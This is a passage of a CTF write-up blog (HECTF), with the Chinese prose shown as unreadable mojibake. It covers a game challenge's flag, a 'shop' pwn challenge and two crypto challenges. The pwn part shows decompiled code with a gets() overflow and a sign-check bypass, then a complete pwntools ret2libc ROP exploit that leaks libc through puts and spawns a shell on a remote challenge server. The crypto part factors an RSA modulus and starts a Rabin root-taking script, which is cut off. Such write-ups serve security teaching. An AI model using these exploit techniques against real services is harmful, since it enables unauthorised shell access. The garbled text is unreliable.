class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=2, c=1</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 2 - 2 ç—…æ¯’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== ç¬¬5å±€ =====</span><br><span class="line">è¯·è¾“å…¥å‚æ•° a ï¼š1</span><br><span class="line">è¯·è¾“å…¥å‚æ•° b ï¼š0</span><br><span class="line">è¯·è¾“å…¥å‚æ•° c ï¼š4</span><br><span class="line"></span><br><span class="line">------ ç¬¬5å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=1, b=0, c=4</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=3, c=1</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 3 - 2 ç—…æ¯’</span><br><span class="line"></span><br><span class="line">===== æ¯”èµ›ç»“æŸï¼=====</span><br><span class="line"></span><br><span class="line">===== æ‰€æœ‰å¯¹å±€è¯¦ç»†è®°å½• ====</span><br><span class="line"></span><br><span class="line">----- ç¬¬1å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=2, b=0, c=9  |  sumå€¼ï¼š63.09175</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=2, c=1  |  sumå€¼ï¼š53.78512</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬2å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=3, b=1, c=4  |  sumå€¼ï¼š58.40205</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=1, c=4  |  sumå€¼ï¼š62.10399</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬3å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=2, b=0, c=3  |  sumå€¼ï¼š65.67390</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=1, b=0, c=4  |  sumå€¼ï¼š67.33289</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬4å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=1, b=0, c=4  |  sumå€¼ï¼š67.33289</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=2, c=1  |  sumå€¼ï¼š53.78512</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬5å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=1, b=0, c=4  |  sumå€¼ï¼š67.33289</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=3, c=1  |  sumå€¼ï¼š41.55686</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœ</span><br><span class="line"></span><br><span class="line">===== æœ€ç»ˆç»“æœ =====</span><br><span class="line">æ­å–œæ‚¨è·èƒœï¼</span><br><span class="line">ç—…æ¯’æ‚„æ‚„æºœèµ°äº†ï¼Œå¹¶ç•™ä¸‹äº†ï¼šHECTF&#123;6NhZkUrkgIZdve6dnzXiAEFVpDuVffUv&#125;</span><br></pre></td></tr></table></figure><h2 id="shop"><a class="markdownIt-Anchor" href="#shop">#</a> <strong>shop</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">record_purchase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter product name:&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter product price:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter purchase description:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œchecksec ä¸€ä¸‹çœ‹çœ‹æ²¡æœ‰ä¿æŠ¤ï¼Œnx éƒ½æ²¡å¼€ï¼Œä¸éœ€è¦å°è¯•æ³„éœ² elf_baseï¼Œé€†å‘åˆ°å¯†ç ï¼š <code>shopadmin123</code> ï¼Œè¿™ä¸ªå‡½æ•°é‡Œå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">manage_inventory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter total purchase amount:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check_amount(v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Amount exceeds limit! Access denied.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Amount verified. Proceeding to record...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> record_purchase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">check_amount</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ€å expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;47.100.66.83&quot;</span>,<span class="number">30527</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter admin password:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;shopadmin123&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter total purchase amount:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product name:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product price:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter purchase description:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_edi_ret = <span class="number">0x0000000000401240</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">record_purchase = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_edi_ret) + p64(puts_got) + p64(puts_plt)+ p64(ret) + p64(record_purchase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_real = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base = puts_real - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">syst_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter admin password:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;shopadmin123&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter total purchase amount:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product name:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product price:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter purchase description:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_edi_ret) + p64(binsh) + p64(syst_addr)+ p64(ret) + p64(record_purchase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto</h1><h2 id="ä¸‹ä¸ªæ£‹å§"><a class="markdownIt-Anchor" href="#ä¸‹ä¸ªæ£‹å§">#</a> <strong>ä¸‹ä¸ªæ£‹å§</strong></h2><blockquote><p>å…ˆåˆ«åšé¢˜äº†ï¼Œflag ç»™ä½ ï¼Œè¿‡æ¥é™ªæˆ‘ä¸‹æŠŠæ£‹ï¼Œå¯¹äº†ï¼Œåˆ«å¿˜äº† flag è¦å¤§å†™ï¼ŒRERBVkFGR0RBWHtWR1ZHWEFYRFZHWEFYRFZWVkZWR1ZYVkdYQX0=</p></blockquote><p>â€‹base64 è§£å¯†å¾—åˆ° <code>DDAVAFGDAX&#123;VGVGXAXDVGXAXDVVVFVGVXVGXA&#125;</code> ï¼Œæ ¹æ®ä¸‹æ£‹å†…å®¹æœç´¢åˆ°æ˜¯æ£‹ç›˜å¯†ç ï¼Œå¾—åˆ° flag <code>hectf&#123;1145145201314&#125;</code> ï¼Œæ£‹ç›˜ç±»å‹æ˜¯ ADFGVXã€‚æœ€å flag ä¸ºï¼š <code>HECTF&#123;1145145201314&#125;</code></p><h2 id="simple_math"><a class="markdownIt-Anchor" href="#simple_math">#</a> <strong>simple_math</strong></h2><blockquote><p>ä¸€é“æ™®é€šçš„æ•°å­¦é¢˜ï¼Œæˆ‘ä¼šåšæ•°å­¦é¢˜ï¼Œä½ ä¼šåšæ•°å­¦é¢˜å—ï¼Ÿ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmodule</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = getPrime(bits)</span><br><span class="line">        g = getPrime(bits)</span><br><span class="line">        p = (f&lt;&lt;bits)+g</span><br><span class="line">        q = (g&lt;&lt;bits)+f</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">assert</span>  p%<span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q%<span class="number">4</span> == <span class="number">3</span></span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line">n = getmodule(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422</span></span><br><span class="line"><span class="string">n = 6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æœ‰ nï¼Œæœ‰ cï¼Œè¯•ç€åˆ†è§£ nï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609</span></span><br><span class="line">K = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">L = n % K</span><br><span class="line">M_low = (n &gt;&gt; <span class="number">128</span>) % K</span><br><span class="line">M_high = (n &gt;&gt; <span class="number">256</span>) % K</span><br><span class="line">H = n &gt;&gt; <span class="number">384</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> carry <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">    A_hi = H - carry</span><br><span class="line">    <span class="keyword">if</span> A_hi &lt; <span class="number">0</span> <span class="keyword">or</span> A_hi &gt;= K:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    A = (A_hi &lt;&lt; <span class="number">128</span>) + L</span><br><span class="line">    Y = (carry &lt;&lt; <span class="number">256</span>) + (M_high &lt;&lt; <span class="number">128</span>) + M_low</span><br><span class="line">    B = Y - (L &lt;&lt; <span class="number">128</span>) - A_hi</span><br><span class="line">    <span class="keyword">if</span> B &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u_sq = B + <span class="number">2</span> * A</span><br><span class="line">    d_sq = B - <span class="number">2</span> * A</span><br><span class="line">    u, u_rem = gmpy2.iroot(u_sq, <span class="number">2</span>)</span><br><span class="line">    d, d_rem = gmpy2.iroot(d_sq, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (u_rem <span class="keyword">and</span> d_rem):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u = <span class="built_in">int</span>(u)</span><br><span class="line">    d = <span class="built_in">int</span>(d)</span><br><span class="line">    f = (u + d) // <span class="number">2</span></span><br><span class="line">    g = (u - d) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(f) <span class="keyword">and</span> isPrime(g) <span class="keyword">and</span> f.bit_length() == <span class="number">128</span> <span class="keyword">and</span> g.bit_length() == <span class="number">128</span>:</span><br><span class="line">        p = (f &lt;&lt; <span class="number">128</span>) + g</span><br><span class="line">        q = (g &lt;&lt; <span class="number">128</span>) + f</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q:&quot;</span>,q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p: 94775913392603172629814422762806227966393098973930911178857725348364686169243</span></span><br><span class="line"><span class="comment">#q: 63947599994968442166142762354632092599995017543858024932091322657529881751163</span></span><br></pre></td></tr></table></figure><p>â€‹æœ‰ pï¼Œqï¼Œnï¼Œcï¼Œeï¼Œä½†æ˜¯ e å’Œ phi ä¸äº’ç´ ï¼Œrabin è¿›è¡Œä¸‰æ¬¡äºŒæ¬¡å¼€æ–¹ï¼Œå¯ä»¥è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥å‚æ•°</span></span><br><span class="line">p = <span class="number">94775913392603172629814422762806227966393098973930911178857725348364686169243</span></span><br><span class="line">q = <span class="number">63947599994968442166142762354632092599995017543858024932091322657529881751163</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422</span></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_sqrt</span>(<span class="params">x, p, q, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    å•ä¸ªå€¼çš„RabinäºŒæ¬¡å¼€æ–¹ï¼ˆæ ¸å¿ƒå‡½æ•°ï¼‰ï¼šæ±‚è§£ yÂ² â‰¡ x mod n</span></span><br><span class="line"><span class="string">    è¿”å›æ¨¡nä¸‹çš„4ä¸ªäºŒæ¬¡å‰©ä½™è§£ï¼ˆRabinè§£å¯†çš„æ ‡å‡†4ä¸ªè§£ï¼‰</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. åˆ†åˆ«åœ¨æ¨¡pã€æ¨¡qä¸‹æ±‚è§£äºŒæ¬¡å‰©ä½™ï¼ˆåˆ©ç”¨4k+3ç´ æ•°ç‰¹æ€§ï¼‰</span></span><br><span class="line">    yp1 = <span class="built_in">pow</span>(x, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    yp2 = p - yp1  <span class="comment"># æ¨¡pçš„ä¸¤ä¸ªè§£</span></span><br><span class="line">    yq1 = <span class="built_in">pow</span>(x, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yq2 = q - yq1  <span class="comment"># æ¨¡qçš„ä¸¤ä¸ªè§£</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. é¢„è®¡ç®—æ¨¡é€†ï¼ˆé¿å…é‡å¤è®¡ç®—ï¼‰</span></span><br><span class="line">    inv_p = gmpy2.invert(p, q)</span><br><span class="line">    inv_q = gmpy2.invert(q, p)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰åˆå¹¶4ç§è§£çš„ç»„åˆï¼Œå¾—åˆ°æ¨¡nçš„4ä¸ªè§£</span></span><br><span class="line">    <span class="comment"># ç»„åˆ1ï¼šyp1 &amp; yq1</span></span><br><span class="line">    y1 = (inv_q * q * yp1 + inv_p * p * yq1) % n</span><br><span class="line">    <span class="comment"># ç»„åˆ2ï¼šyp1 &amp; yq2</span></span><br><span class="line">    y2 = (inv_q * q * yp1 + inv_p * p * yq2) % n</span><br><span class="line">    <span class="comment"># ç»„åˆ3ï¼šyp2 &amp; yq1</span></span><br><span class="line">    y3 = (inv_q * q * yp2 + inv_p * p * yq1) % n</span><br><span class="line">    <span class="comment"># ç»„åˆ4ï¼šyp2 &amp; yq2</span></span><br><span class="line">    y4 = (inv_q * q * yp2 + inv_p * p * yq2) % n</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(y1), <span class="built_in">int</span>(y2), <span class="built_in">int</span>(y3), <span class="built_in">int</span>(y4)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_e8_with_rabin</span>(<span class="params">c, p, q, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    åˆ©ç”¨Rabinæ ¸å¿ƒæ€æƒ³æ±‚è§£e=8çš„æƒ…å†µï¼šmâ¸ â‰¡ c mod n</span></span><br><span class="line"><span class="string">    æ­¥éª¤ï¼šè¿ç»­3æ¬¡äºŒæ¬¡å¼€æ–¹ï¼ˆ8=2Â³ï¼‰ï¼Œé€æ­¥è¿­ä»£å€™é€‰è§£</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># ç¬¬1æ¬¡å¼€æ–¹ï¼šæ±‚è§£ x1Â² â‰¡ c mod n â†’ x1 = m^4ï¼ˆåˆå§‹å€™é€‰è§£ï¼‰</span></span><br><span class="line">    candidates_1 = rabin_sqrt(c, p, q, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬1æ¬¡å¼€æ–¹ï¼ˆå¾—åˆ°m^4çš„å€™é€‰è§£ï¼‰ï¼šå…±<span class="subst">&#123;<span class="built_in">len</span>(candidates_1)&#125;</span>ä¸ª&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¬¬2æ¬¡å¼€æ–¹ï¼šå¯¹æ¯ä¸ªx1ï¼Œæ±‚è§£ x2Â² â‰¡ x1 mod n â†’ x2 = m^2</span></span><br><span class="line">    candidates_2 = <span class="built_in">set</span>()  <span class="comment"># ç”¨é›†åˆå»é‡</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> candidates_1:</span><br><span class="line">        res = rabin_sqrt(x1, p, q, n)</span><br><span class="line">        candidates_2.update(res)</span><br><span class="line">    candidates_2 = <span class="built_in">list</span>(candidates_2)</span><br><span class="line">    <span class="built_in">print</span>(<span 